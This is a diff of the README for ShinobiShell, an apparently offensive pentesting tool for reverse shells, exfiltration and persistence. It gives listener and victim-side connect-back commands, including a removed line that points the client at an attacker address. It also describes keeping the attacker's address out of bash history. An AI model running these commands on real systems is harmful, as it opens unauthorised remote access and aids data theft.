@@ -1,20 +1,39 @@
 # ShinobiShell
 An experimental shell that handles file exfiltration, exploit injection and various other obnoxious tasks.
 ```
-Shinobi shell is a shell specifically designed to make exfiltration, proxying, persistance and other pentesting actions easier.
+usage: PROG [options]
 
-'-a', '--address', The machine address with a Shinobi Shell listener running'
-'-l', '--listen', 'Starts Shinobi Shell listener on port passed in'
-'-k', '--key', 'Secret shared key used to create an encrypted tunnel between Shinobi Server and Clients (Required)'
-'-r', '--serveraddress', 'Local IP Address used for universal reverse shell handler'
+Shinobi shell is a shell specifically designed to make exfiltration, proxying,
+persistance and other pentesting actions easier.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -t, --ttyCheat        Shows tty shell cheat sheet (need a tty shell for shinobi shell to work)
+  -c, --connect         Flag that indicates a reverse shell connection (use this on victim machine)
+  -l LISTEN, --listen LISTEN
+                        Starts Shinobi Shell listener on port passed in
+  -k, --key             Will create an encrpyted tunnel if encrpytion libs available
+  -r SERVERADDRESS, --serveraddress SERVERADDRESS
+                        Local IP Address used for universal reverse shell
+                        handler (optional - use if different than default)
 ```
 Use:
 
 Server (Attacking box) 
-`./shinobishell.py -l 4443 -k 1234567890123456`
+`./shinobishell.py -l 4443 -k
+`-l` Port server will listen on
+`-k` Requesting an encrypted tunnel server
 
 Client (Penetrated box) 
-`./shinobishell.py --address 192.168.1.2:4443 -k 123456790123456` 
+`./shinobishell.py -c -k ` 
+`-c` Connect back to a server
+`-k` Try and make an encrytped tunnel
+
+For both server and client, you'll be propmted for a password when using `-k`
+
+For `-c` you will be prompted at run time for the server address
+
+Both `-c` and `-k` were moved to runtime inputs to prevent leaking attacking machine address and key in bash history
 
 ```
 Shinobi Shell v1.0
